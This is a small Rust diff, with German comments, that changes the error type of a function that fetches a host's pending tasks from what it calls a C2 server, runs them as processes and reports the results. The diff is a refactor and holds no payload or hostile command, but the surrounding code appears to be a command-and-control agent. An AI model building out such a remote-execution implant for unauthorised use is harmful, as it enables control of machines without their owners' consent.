@@ -13,6 +13,7 @@ use tokio::process::Command;
 
 use std::time::Duration;
 
+use kx_core::c2::transport::TransportError;
 use kx_core::c2::{Task, TaskResultRequest, STATUS_DONE, STATUS_FAILED, STATUS_PENDING};
 use tokio::time::timeout;
 use tracing::{error, info, warn};
@@ -28,10 +29,7 @@ const MAX_RESULT_LEN: usize = 8 * 1024;
 /// Holt die offenen Tasks dieses Hosts, fuehrt sie aus und meldet die Ergebnisse.
 ///
 /// Gibt die Anzahl der ausgefuehrten Tasks zurueck.
-pub async fn run_pending_tasks(
-    client: &C2Client,
-    host_id: &str,
-) -> Result<usize, crate::c2::C2Error> {
+pub async fn run_pending_tasks(client: &C2Client, host_id: &str) -> Result<usize, TransportError> {
     let tasks = client.fetch_tasks().await?;
     let pending: Vec<&Task> = tasks
         .iter()
